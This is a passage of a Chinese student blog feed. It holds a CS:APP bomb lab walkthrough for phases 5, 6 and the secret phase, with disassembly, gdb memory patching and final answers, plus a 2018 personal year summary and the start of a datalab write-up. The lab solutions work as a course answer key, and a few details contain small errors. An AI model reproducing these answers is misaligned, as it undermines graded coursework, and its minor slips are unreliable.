class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><p>　　这道题长度又一次增加了，不过好在难度还不算太大。其实能做完第四题的话做第五题问题应该是不大的。和之前一样。我们先尝试着将整个代码拆分成几个部分。<br>　　首先，要求我们输入的应该是一个字符串，且长度必须为6。接下来的几行是一个循环，我们先跳过。先看最后面的几行代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4010ae:c6 44 24 16 00       movb   $0x0,0x16(%rsp)</span><br><span class="line">4010b3:be 5e 24 40 00       mov    $0x40245e,%esi</span><br><span class="line">4010b8:48 8d 7c 24 10       lea    0x10(%rsp),%rdi</span><br><span class="line">4010bd:e8 76 02 00 00       callq  401338 &lt;strings_not_equal&gt;</span><br></pre></td></tr></table></figure></p><p>　　上面几行将栈上面位于%rsp+10～%rsp+15的字符串与首地址为0x40245e的字符串相比较，打印地址后我们看到，字符串为flyers，也就是说我们的输入经过变换之后要变成flyers这个字符串。这个时候我们再回去看一下循环体内部是怎样做变换的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">40108b:0f b6 0c 03          movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">40108f:88 0c 24             mov    %cl,(%rsp)</span><br><span class="line">401092:48 8b 14 24          mov    (%rsp),%rdx</span><br><span class="line">401096:83 e2 0f             and    $0xf,%edx</span><br><span class="line">401099:0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">4010a0:88 54 04 10          mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">4010a4:48 83 c0 01          add    $0x1,%rax</span><br><span class="line">4010a8:48 83 f8 06          cmp    $0x6,%rax</span><br><span class="line">4010ac:75 dd                jne    40108b &lt;phase_5+0x29&gt;</span><br></pre></td></tr></table></figure></p><p>　　注意到这一段代码，一次取出每一个字符。并将其与0xf相与，也就是说我们取出后四位的值c，再加上0x4024b0得到一个值v，再取出内存地址为v的值，放入栈当中。这样说可能有点难理解。我们来举一个例子。比如第一个字符串处理之后要变成’f’，查询ASCII得，相当与102，也就是0x66, 再查看一下内存，看到‘f’位于0x4024b9。因此我们需要的c的值为9，为了方便，我第一个字符输入的是i(0x69),和0xf相与之后恰好为9，满足要求。后面的同理，不再赘述。由此，本题成功解决了。</p><h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><p>　　这道题可以说是有点丧心病狂了。难度和之前感觉完全不在一个档次上。不过毕竟是压轴题，也可以理解。同样的，我们先将代码拆分成几个小部分。<br>　　首先，题目读取了六个数字。然后需要对这六个数字做出相当长的处理。下面的这一段应该是目前为止最难理解的一个点。如果无法理解，还请多看几遍。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// 下面为一个嵌套循环，终止条件为r12 == 6 目的为检测是否所有字符均不相等以及小于等于6</span><br><span class="line">// %eax = a[i] (%r13)</span><br><span class="line">// %rbp = &amp;a[i]</span><br><span class="line">401114:4c 89 ed             mov    %r13,%rbp</span><br><span class="line">401117:41 8b 45 00          mov    (%r13),%eax</span><br><span class="line">40111b:83 e8 01             sub    $0x1,%eax</span><br><span class="line">40111e:83 f8 05             cmp    $0x5,%eax</span><br><span class="line">401121:76 05                jbe    401128 &lt;phase_6+0x34&gt;  // a[i] &gt; 6 爆炸</span><br><span class="line">401123:e8 12 03 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401128:41 83 c4 01          add    $0x1,%r12d</span><br><span class="line">40112c:41 83 fc 06          cmp    $0x6,%r12d</span><br><span class="line">401130:74 21                je     401153 &lt;phase_6+0x5f&gt;   // %r12 == 6 退出循环</span><br><span class="line">// 第二层循环</span><br><span class="line">401132:44 89 e3             mov    %r12d,%ebx</span><br><span class="line">401135:48 63 c3             movslq %ebx,%rax</span><br><span class="line">401138:8b 04 84             mov    (%rsp,%rax,4),%eax</span><br><span class="line">40113b:39 45 00             cmp    %eax,0x0(%rbp)</span><br><span class="line">40113e:75 05                jne    401145 &lt;phase_6+0x51&gt;   // a[i] != a[i+j] 否则爆炸</span><br><span class="line">401140:e8 f5 02 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401145:83 c3 01             add    $0x1,%ebx</span><br><span class="line">401148:83 fb 05             cmp    $0x5,%ebx</span><br><span class="line">40114b:7e e8                jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">// 第二层循环外</span><br><span class="line">40114d:49 83 c5 04          add    $0x4,%r13</span><br><span class="line">401151:eb c1                jmp    401114 &lt;phase_6+0x20&gt;</span><br></pre></td></tr></table></figure></p><p>　　接下来的部分就比较好理解了。最终对整个程序的影响是将每一个值a[i]转化为7-a[i]。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">401153:48 8d 74 24 18       lea    0x18(%rsp),%rsi</span><br><span class="line">401158:4c 89 f0             mov    %r14,%rax</span><br><span class="line">40115b:b9 07 00 00 00       mov    $0x7,%ecx</span><br><span class="line">401160:89 ca                mov    %ecx,%edx</span><br><span class="line">401162:2b 10                sub    (%rax),%edx</span><br><span class="line">401164:89 10                mov    %edx,(%rax)  // a[i] = 7 - a[i]</span><br><span class="line">401166:48 83 c0 04          add    $0x4,%rax</span><br><span class="line">40116a:48 39 f0             cmp    %rsi,%rax</span><br><span class="line">40116d:75 f1                jne    401160 &lt;phase_6+0x6c&gt;</span><br></pre></td></tr></table></figure></p><p>　　再接下来这一段就比较麻烦了。和之前一样，我采用了尝试这打出源代码的方法进行理解。由于接下来的两段代码经常要访问内存，为了方便理解，我将内存代码打出来，欢迎查阅。</p><table><thead><tr><th></th><th>address</th><th>address + 4</th><th>address + 8</th><th>address + 12</th></tr></thead><tbody><tr><td>0x6032d0</td><td>0x0000014c</td><td>0x00000001</td><td>0x006032e0</td><td>0x00000000</td></tr><tr><td>0x6032e0</td><td>0x000000a8</td><td>0x00000002</td><td>0x006032f0</td><td>0x00000000</td></tr><tr><td>0x6032f0</td><td>0x0000039c</td><td>0x00000003</td><td>0x00603300</td><td>0x00000000</td></tr><tr><td>0x603300</td><td>0x000002b3</td><td>0x00000004</td><td>0x00603300</td><td>0x00000000</td></tr><tr><td>0x603310</td><td>0x000001dd</td><td>0x00000005</td><td>0x00603320</td><td>0x00000000</td></tr><tr><td>0x603320</td><td>0x000001bb</td><td>0x00000006</td><td>0x00000000</td><td>0x00000000</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">401176:48 8b 52 08          mov    0x8(%rdx),%rdx</span><br><span class="line">40117a:83 c0 01             add    $0x1,%eax</span><br><span class="line">40117d:39 c8                cmp    %ecx,%eax</span><br><span class="line">40117f:75 f5                jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">401181:eb 05                jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line">401183:ba d0 32 60 00       mov    $0x6032d0,%edx</span><br><span class="line">401188:48 89 54 74 20       mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">40118d:48 83 c6 04          add    $0x4,%rsi</span><br><span class="line">401191:48 83 fe 18          cmp    $0x18,%rsi</span><br><span class="line">401195:74 14                je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line">401197:8b 0c 34             mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">40119a:83 f9 01             cmp    $0x1,%ecx</span><br><span class="line">40119d:7e e4                jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line">40119f:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">4011a4:ba d0 32 60 00       mov    $0x6032d0,%edx</span><br><span class="line">4011a9:eb cb                jmp    401176 &lt;phase_6+0x82&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">　<span class="comment">// %rsi : 4 * i</span></span><br><span class="line">  <span class="comment">// %eax : 用于和a[i]做比较</span></span><br><span class="line">  <span class="comment">// %ecx : a[i]</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (a[i]&lt;=<span class="number">1</span>) &#123;</span><br><span class="line">        M[%rsp + <span class="number">8</span> * i + <span class="number">32</span>] = <span class="number">0x6032d0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 经查看内存可得</span></span><br><span class="line">        M[%rsp + <span class="number">8</span> * i + <span class="number">32</span>] = <span class="number">0x6032d0</span> + <span class="number">16</span> * (a[i]<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　关于上面的这段函数，我们可以理解为它在构造一个结构体Node(注意，指针为64位，且为小端)，其中Node的成员如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Node &#123;</span><br><span class="line">  <span class="keyword">int</span> value;</span><br><span class="line">  <span class="keyword">int</span> id;</span><br><span class="line">  Node* next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　倘若我们这样看，会发现整个代码容易理解了很多，结合具体内存中的值，我们发现，下面的这一段其实就是将各个结构体元素连接起来，形成一个链表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">4011ab:48 8b 5c 24 20       mov    0x20(%rsp),%rbx</span><br><span class="line">4011b0:48 8d 44 24 28       lea    0x28(%rsp),%rax</span><br><span class="line">4011b5:48 8d 74 24 50       lea    0x50(%rsp),%rsi</span><br><span class="line">4011ba:48 89 d9             mov    %rbx,%rcx</span><br><span class="line">4011bd:48 8b 10             mov    (%rax),%rdx</span><br><span class="line">4011c0:48 89 51 08          mov    %rdx,0x8(%rcx)</span><br><span class="line">4011c4:48 83 c0 08          add    $0x8,%rax</span><br><span class="line">4011c8:48 39 f0             cmp    %rsi,%rax</span><br><span class="line">4011cb:74 05                je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line">4011cd:48 89 d1             mov    %rdx,%rcx</span><br><span class="line">4011d0:eb eb                jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line">4011d2:48 c7 42 08 00 00 00 movq   $0x0,0x8(%rdx)</span><br></pre></td></tr></table></figure></p><p>　　最后这一段其实就好理解很多了。其实就是从前往后遍历链表，然后检查下一个结构体元素的value是否大于上一个的，否则爆炸。再看一下前面的内存值。我们就可以得到满足每一个元素value均大于上一个的链表的顺序了：2，1，6，5，4，3。当然要是你信心满满直接把这个顺序输入进去的话（像我一样），你会发现，炸弹还是爆炸了。别忘了，前面有一个操作将a[i]变成了7-a[i]，因此，我们应该再处理一下，得到最终的正确答案为：5，6，1，2，3，4<br>　　Congratulations! You’ve defused the bomb.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">4011da:bd 05 00 00 00       mov    $0x5,%ebp</span><br><span class="line">4011df:48 8b 43 08          mov    0x8(%rbx),%rax</span><br><span class="line">4011e3:8b 00                mov    (%rax),%eax</span><br><span class="line">4011e5:39 03                cmp    %eax,(%rbx)</span><br><span class="line">4011e7:7d 05                jge    4011ee &lt;phase_6+0xfa&gt;</span><br><span class="line">4011e9:e8 4c 02 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">4011ee:48 8b 5b 08          mov    0x8(%rbx),%rbx</span><br><span class="line">4011f2:83 ed 01             sub    $0x1,%ebp</span><br><span class="line">4011f5:75 e8                jne    4011df &lt;phase_6+0xeb&gt;</span><br></pre></td></tr></table></figure></p><h3 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h3><p>　　然而，真的通关了吗？<br>　　细心的同学可能会发现（我也发现啦！），在bomb.c中有着这样一段注释：</p><blockquote><p>/Wow, they got it!  But isn’t something… missing?  Perhaps<br>      something they overlooked?  Mua ha ha ha ha!</p></blockquote><p>　　从这句话，我们可以猜出，作者果然还是有阴谋的。于是我们再重新回去看了一下，发现了一个神奇的函数，叫secret_phase，果然有问题。crtf+f查找，发现这是在phase_defused中调用的，而且再看一下它调用的相关代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4015d1:48 89 44 24 68       mov    %rax,0x68(%rsp)</span><br><span class="line">4015d6:31 c0                xor    %eax,%eax</span><br><span class="line">4015d8:83 3d 81 21 20 00 06 cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;</span><br><span class="line">4015df:75 5e                jne    40163f &lt;phase_defused+0x7b&gt;</span><br></pre></td></tr></table></figure></p><p>　　我们发现，只有当前6个炸弹全部拆除后才可以调用。这不明摆着是彩蛋了吗。接下来一大坨代码就是看你能不能顺利揭开彩蛋了。<br>　　接下来，再看下这坨代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">4015e1:4c 8d 44 24 10       lea    0x10(%rsp),%r8</span><br><span class="line">4015e6:48 8d 4c 24 0c       lea    0xc(%rsp),%rcx</span><br><span class="line">4015eb:48 8d 54 24 08       lea    0x8(%rsp),%rdx</span><br><span class="line">4015f0:be 19 26 40 00       mov    $0x402619,%esi</span><br><span class="line">4015f5:bf 70 38 60 00       mov    $0x603870,%edi</span><br><span class="line">4015fa:e8 f1 f5 ff ff       callq  400bf0 &lt;__isoc99_sscanf@plt&gt;   // 读取两个整数和一个字符串</span><br><span class="line">4015ff:83 f8 03             cmp    $0x3,%eax</span><br><span class="line">401602:75 31                jne    401635 &lt;phase_defused+0x71&gt;   // 没有读取到三个，原地爆炸</span><br><span class="line"></span><br><span class="line">401604:be 22 26 40 00       mov    $0x402622,%esi</span><br><span class="line">401609:48 8d 7c 24 10       lea    0x10(%rsp),%rdi</span><br><span class="line">40160e:e8 25 fd ff ff       callq  401338 &lt;strings_not_equal&gt;    // 将读取的字符串与0x402622为首地址的字符串作比较</span><br><span class="line">401613:85 c0                test   %eax,%eax</span><br><span class="line">401615:75 1e                jne    401635 &lt;phase_defused+0x71&gt;  // 字符串和给定的不相同，还是爆炸</span><br></pre></td></tr></table></figure></p><p>　　恩，好吧，从一个给定的串中读取一些东西，打印0x402619后面的几个字符，我们发现结果是“%d %d %s”，读取两个整数和一个字符串。可事情并没有这么简单。我们尝试打印一下0x603870，发现字符串就只有“7 0”，不可能读3个数字。那我们怎么玩？？<br>　　看来我们只好作弊了。使用gdb直接用print指令更改内存的值，将“7 0”后面补一点东西，补什么呢？那当然是0x402622上面的东西了。打印一下，发现是“DrEvil”，好吧满满的恶意。补上之后（可以用类似 p {int}0x603873=’D’ 这样的指令为内存单元赋值），就顺利进入了secret_phase函数了。<br>　　再看一下这个函数干了些什么。恩，读取了一个字符串，再用strtol函数将其转化为数字，也就是说，我们目的就是输入一个满足要求的数字。然后，又与2进行比较，也就是说，我们目的是要运行fun7函数，并且得到答案为2的返回值。<br>　　接下来我们看一下fun7函数。主体大概是这样子的。可以看出，这是一个递归。其中的v为我们输入的那个值。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (x &lt;= v) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * fun7(...);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (x == v) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * fun7(...)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　好了，我们发现代码中有<b>0x8(%rdi),%rdi</b>这样的指令，接下来又要打印内存信息了。注意到一开始传入的值为0x6030f0,故我们打印一下0x6030f8和0x603100的值，发现答案为0x603110和0x603130,又是两个地址。并且，打印0x6030f0,0x603100,0x603110我们发现，结果都是一个比较小的值，不难猜测，这应该是一个二叉树。于是，按照这个规律，我们可以将整棵树打印出来.（其中各个框内表示的是该点的地址）</p><p><table align="center"><tr><td colspan="8">0x6030f0</td></tr><tr><td colspan="4">0x603110</td><td colspan="4">0x603130</td></tr><tr><td colspan="2">0x603190</td><td colspan="2">0x603150</td><td colspan="2">0x603170</td><td colspan="2">0x6031b0</td><br></tr><tr><td>0x6031f0</td><td>0x603250</td><td>0x603270</td><td>0x603230</td><td>0x6031d0</td><td>0x603290</td><td>0x603210</td><td>0x6032b0</td></tr></table><br>　　接着，再倒推，2 = 2 * 1, 1 = 2 * 0 + 1 . 则应该选择地址为0x603150的点，打印得到，答案为22，结束。</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> assembly </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Summary 2018</title>
      <link href="/2019/01/01/summary-2018/"/>
      <url>/2019/01/01/summary-2018/</url>
      
        <content type="html"><![CDATA[<h3 id="2018年的一个小总结："><a href="#2018年的一个小总结：" class="headerlink" title="2018年的一个小总结："></a>2018年的一个小总结：</h3><p>　　首先，其实不知道应该说什么比较好，整个2018年的话，应该还是算过得去吧。不知道该写什么，就还是按照时间的顺序写一下一些对我影响比较大的事情吧。</p><h4 id="年初"><a href="#年初" class="headerlink" title="年初"></a>年初</h4><p>　　记得2018年刚开始的时候，感慨还是挺深的，毕竟处在高三的中期，各个科目也基本都开始了总复习，心情还是略有些紧张的。尽管对很多事情都不确定，但还是硬着头皮往前走，当时基本上就一个目标，把高考考好。那段时间也算是挺努力的了，寒假也没玩什么游戏，基本上花了挺多时间来学习。</p><h4 id="四五月份"><a href="#四五月份" class="headerlink" title="四五月份"></a>四五月份</h4><p>　　这段时间就算是出生以来最难熬的一段时期了。天气十分的炎热，坐在教室里也几乎静不下心来学习。整个人的状态很乱。每天基本上就是刷题，除了题目还是题目，整个人真的十分的疲惫，但也没有任何办法，只能继续坚持下去。也许，那段时间也算是大学之前一段十分快乐的时光吧， 毕竟全班的同学一起向着同一个目标努力，这种机会以后基本上也都不会再有了。</p><h4 id="六月七号-八号"><a href="#六月七号-八号" class="headerlink" title="六月七号 八号"></a>六月七号 八号</h4><p>　　每一年的这两天我想对全国的几百万考生来说都是及其难忘的。即便现在已经过了半年，那个时候自己的状态，心情，甚至在什么时间干了什么事，至今都记忆犹新。还有印象六月七号的那个晚上，下课时分，和另一个同学一起，在教室里谈论着未来。将来会发生什么事呢？考试要是砸了会怎么样呢？恩，基本上整个人都在那样的状态下，坐立不安。</p><p>　　到了六月八号下午，也许那是在那段时间心态最平和的时候了，什么也没说，什么也没想。考完恍若隔世，也是吧，毕竟十几年的读书最终换来的，最主要的也便是那一张写着成绩的白纸罢了。和父母一起，走在学校的街道上，心情说不上好，说不上坏。考完了，理论上来说应该是要比较开心的，可是在这种场合下却也怎么都开心不起来。是的，一个强烈的直觉告诉我：这次考试考得并不好，或者说很差。</p><p>　　接下来的一段时间里，基本上还是尽量让自己不要再去回忆考试的事情了。考得好坏都已经注定，再去想确实也没有任何意义。那段时间和母亲一起去珠海找我哥，又去普宁了一个同学家玩，接下来就是毕业典礼，然后就是揭晓成绩的时刻。</p><h4 id="成绩揭晓"><a href="#成绩揭晓" class="headerlink" title="成绩揭晓"></a>成绩揭晓</h4><p>　　恩，看到成绩出来的那一刻，就像高考完铃声响起的刹那，脑子是空白的，不知该说些什么。然后就是不敢相信自己–我拿到了自己几乎未曾想过的分数，甚至都不敢去再看它一眼。还有印象，那个中午我啥也没吃，就躺在床上发呆，想想自己今后的路该怎么走。是要复读吗？不，绝对不行，我没有勇气去再面对一次高三。就这样吧，差一点就差一点吧，毕竟考试总有人会考得不好的，为什么不能偏偏是我呢？基本上，其实经过了一两天的缓和，也就没有再去想那么多了。尽管现在再次提起还是有些难过的，但也没办法吧。</p><p>　　后面到八月初，就又是一段算是十分快乐的时光了。加入了本地的一个补习社，和几个小伙伴们一起，备课，讲课，每天基本上都是在这样的重复中度过。最多的时候一天能有8节课，常常不得已要利用睡觉的时间来备课。那段时间觉得很累，但是却很舒坦。这里放一张照片纪念一下。<br><img src="/2019/01/01/summary-2018/image.jpg" alt="知新"></p><h4 id="Before-enter-University"><a href="#Before-enter-University" class="headerlink" title="Before enter University"></a>Before enter University</h4><p>　　在忙完了辅导社之后，接下来的时间基本上都是在做一些提前的学习了。毕竟想要在大学考得好，还是需要提前下一番功夫，起码在这一点，要比别人赢在起跑线上，真的不愿意再一次输了。也就是在那段时间，认识了吴晓杰师兄和陈钊燚师兄，也是在他们的帮助下，对大学有了一点了解，也算是更加了解了一下自己究竟想要一些什么。然后就是在不断的学习了。</p><p>　　很奇怪，也许是高考考得不好，也许是因为一些其他什么事情，自从那段时间以来，心里最大的目标就只剩学习（其实还有看番hhh）了。可能是心里那一股不服输的劲吧，以及对自己越来越高的要求，总是不断地告诉自己，必须比别人多付出更多的时间，一定要学得更多，更好。也是从那段时间开始，基本上就已经不再碰任何游戏了，社团也不想参加，变成了一个真真正正的“宅”了。也许这确实有些不好吧。</p><h4 id="Enter-UniqueStudio"><a href="#Enter-UniqueStudio" class="headerlink" title="Enter UniqueStudio"></a>Enter UniqueStudio</h4><p>　　经过了开学以来的努力学习，以及一点运气，最后终于挺过了数轮面试，进入到了联创团队（<a href="https://bbs.hustunique.com/" target="_blank" rel="noopener">uniquestudio</a>）当中。还是很高兴能成为团队的一员的，至少说明了，自己的努力真的还是有回报的。然后再接下来，到年底的时间里面，基本上大部分的课余时间都留给了团队了。平均每周四五十小时以上的学习时间，一周又一周地过去。</p><p>　　刚开始进来的那段时间，也许是最艰难的。很多东西都完全不会，android studio的各种配置什么的问题可以卡好几天。在第一个任务的时候，还啥都不会，所有东西都是边学边做，一个小功能要重复改来改去弄好多遍，往往弄很多遍之后还是不太好，弄到自己也是很烦躁。所以第一个任务做得很差。到了第二个任务的时候，慢慢地开始注意了一些设计模式方面的问题，不会太盲目地想往哪里加功能就往哪里加，不过也是由于经验太少，反复踩了很多坑。好在最后终于算是基本完成了要求了，尽管花的时间比预计的要多一些。基本上对很多东西的了解又加深了一些。</p><p>　　再后面已经接近年末了，第二期任务做完一段时间过后，搭建了自己的第一个博客，也就是这里。也开始尝试这把自己的一些想法记录下来吧。然后也下决心开始看CSAPP这一本书了。说实话，这本书确实很多东西讲得很好（尽管我现在看的还很少），基本上能把我想要知道的东西都讲了，不过语言还是令人很难受的一个坎，毕竟从初中开始英语就不怎么样。好在还有翻译这种神奇的东西，基本上靠半蒙半查加上一点直觉，慢慢地让自己能够静下心来看这本书了，也算是自己的一个进步了吧。</p><p>　　然后就基本上到了年末了，也就是前几天了。慢慢开始减少了一些花在这方面的时间了，稍微把时间分配给了一下课内的一些知识，毕竟说到底，到现在我都没办法确定自己究竟想要读研究生还是直接出来工作，毕竟大一上学期还是不要太早下论断的好吧。还是得看一下这学期末的成绩吧，如果能够考得比较好，将来有希望能保研去清北复交或者浙大中科大之类的，那还是有可能争取一下的。这个寒假应该就需要结合自己的成绩想清楚了吧。</p><h4 id="expection"><a href="#expection" class="headerlink" title="expection"></a>expection</h4><p>　　其实感觉这东西很说不准。毕竟现在真的还没办法未来要做什么。但近期的一些flag还是可以立一下的。尽量在寒假把CSAPP多看一点吧，最好能看完70%以上吧，以及最好多做几个实验，也算是巩固一下自己看书学到的一些知识。然后下学期开始后尽量快点把这本书看完，接着花几个星期的时间把开发艺术探索，源码设计模式等补了，有时间的话看一下争取在大一下学期结束之前把计网和现代操作系统看了吧。基本上大一能把这几本书看完就已经很不错了。</p><p>　　然后如果将来要走偏图形这一块的话，那可能需要稍微为这方面做一点准备了。以及线代一定要学好。如果将来选择争取保研的话，那可能要找一些数学方面的更深入的书籍学习一下，物理可能也需要花一些时间。毕竟理工科无论如何这两个科目一定不能差吧。</p><p>　　然后如果将来选择放弃保研，毕业后就直接出来工作的话，那可能会在大一的暑假看一下linux内核的一些东西或者是Android底层的源码，起码要比现在再深入一些吧。</p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>　　最后还是再罗嗦一下吧。总的来说，2018年对我自己来说确实可以称得上是转折性的一年。这一年里发生了太多值得我去回忆的事情。我也很庆幸，自己能够变成现在这个样子，尽管它未必很好。很开心，现在身边能有很多优秀的同学值得我去学习，未来的路子还长，还需要一步一个脚印继续慢慢往前走去。<br>　　结尾还是要放点啥，就留下我特别喜欢的一段话吧：</p><blockquote><p>人の人生は、自分の墓へ走る汽车に乗っているようだ。途中は沢山駅があるけど、ずっと最後まで侧にいってくれる人はいない。だから、いってくれた人が降りる前に、いくらさびしくても、感谢の気持ちでさよならと言おう。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> summary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>csapp-Datalab</title>
      <link href="/2018/12/25/csapp-Datalab/"/>
      <url>/2018/12/25/csapp-Datalab/</url>
      
        <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>　　这是csapp系列的第一篇文章。本文主要讲一下关于 <a href="http://csapp.cs.cmu.edu/3e/README-datalab" target="_blank" rel="noopener"><strong>datalab [Updated 11/2/18]</strong></a> 的解决方法以及简单的思路。如果有哪里写的不清楚或者有问题，欢迎联系我修改(右下角小图标点开即可对话)。<br>  注：其中某些题目应该有更优的解法。以下仅供参考</p><h3 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h3><p>题意：用 ~ 和 &amp; 运算符实现 Xor 运算符<br>思路：我们知道Xor运算符是对每一个位，相同的话返回0，不同的话返回1。题目中仅有 &amp; 是双目运算符，那么我们可以采用 &amp; 运算符获得均为1的位，再取反，同理，用 &amp; 和 ~ 获得均为 0 的位，再取反，最后两者再进行 &amp; ，即可得到答案。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~(x&amp;y)&amp;~(~x&amp;~y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><p>题意：让你输出反码下的最小值<br>思路：水题。。直接由定义得。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> 